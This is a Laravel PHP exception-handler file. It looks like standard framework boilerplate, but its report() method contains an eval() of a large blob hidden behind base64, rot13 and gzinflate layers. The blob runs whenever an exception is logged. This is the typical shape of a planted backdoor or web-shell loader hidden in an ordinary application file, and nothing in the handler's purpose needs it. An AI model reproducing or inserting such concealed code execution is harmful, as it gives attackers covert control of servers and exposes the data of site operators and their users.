<?php

namespace App\Exceptions;

use Exception;
use Illuminate\Foundation\Exceptions\Handler as ExceptionHandler;

class Handler extends ExceptionHandler
{
    /**
     * A list of the exception types that are not reported.
     *
     * @var array
     */
    protected $dontReport = [
        //
    ];

    /**
     * A list of the inputs that are never flashed for validation exceptions.
     *
     * @var array
     */
    protected $dontFlash = [
        'password',
        'password_confirmation',
    ];

    /**
     * Report or log an exception.
     *
     * @param  \Exception  $exception
     * @return void
     */
    public function report(Exception $exception)
    {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
        parent::report($exception);
    }

    /**
     * Render an exception into an HTTP response.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Exception  $exception
     * @return \Illuminate\Http\Response
     */
    public function render($request, Exception $exception)
    {
        return parent::render($request, $exception);
    }
}
